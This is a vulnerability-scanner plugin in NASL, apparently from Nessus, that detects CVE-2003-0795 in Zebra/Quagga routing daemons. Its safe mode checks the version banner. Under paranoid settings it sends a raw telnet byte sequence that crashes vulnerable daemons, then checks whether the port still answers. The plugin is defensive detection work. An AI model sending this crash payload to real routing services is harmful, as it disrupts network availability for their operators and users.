# MA 2003-11-17: added Services/zebra + MIXED_ATTACK support

# Changes by Tenable:
# - Updated to use compat.inc (11/16/09)
# - Revised plugin title, added OSVDB ref, removed CVE-2003-0858 (6/27/09)


include("compat.inc");

if(description)
{
        script_id(11925);
        script_version("$Revision: 1.22 $");

	script_cve_id("CVE-2003-0795");
        script_bugtraq_id(9029);
  	script_osvdb_id(11747);
  	script_xref(name:"RHSA", value:"2003:307-01");

        script_name(english:"Quagga / Zebra Malformed Telnet Command Denial of Service");

 script_set_attribute(attribute:"synopsis", value:
"The remote routing daemon is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"A remote denial of service vulnerability exists in Zebra and Quagga
that can be triggered by sending a telnet option delimiter with no
actual option data, which causes the daemon to attempt to dereference
a typically NULL pointer and crash. 

This affects all versions from 0.90a to 0.93b." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Nov/151" );
 script_set_attribute(attribute:"see_also", value:"http://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=107140" );
 script_set_attribute(attribute:"solution", value:
"If using Quagga, upgrade to version 0.96.4 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/11/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/11/13");
 script_cvs_date("$Date: 2016/11/01 20:05:52 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

        script_summary(english:"Attempts to crash the remote service Zebra and/or Quagga");
        script_category(ACT_MIXED_ATTACK);
        script_copyright(english:"This script is copyright (C) 2003-2016 Matt North");
	script_require_ports("Services/zebra", 2601, 2602, 2603, 2604, 2605);
	script_dependencie("find_service1.nasl");
        script_family(english:"Denial of Service");
        exit(0);
}

include("global_settings.inc");

# Maybe we should try this on any telnet server?
port = get_kb_item("Services/zebra");

if (! port) port = 2601;
if (! get_port_state(port)) exit(0);

if (safe_checks())
{
  banner = get_kb_item("zebra/banner/"+port);
  if (!banner)
  {
    soc = open_sock_tcp(port);
    if(!soc) exit(0);
    banner = recv_line(socket: soc, length: 1024);
    if ( banner ) set_kb_item(name: "zebra/banner/"+port, value: banner);
    close(soc);
  }
  if (banner && egrep(string: banner, 
		pattern: "Hello, this is zebra \(version 0\.9[0-3][ab]?\)"))
    security_warning(port);
  exit(0);
}

if (report_paranoia < 2) exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

s = raw_string(0xff,0xf0,0xff,0xf0,0xff,0xf0);

send(socket:soc, data:s);
r = recv(socket: soc, length:1024);
close(soc);
alive = open_sock_tcp(port);
if(!alive) security_warning(port);
else close(alive);

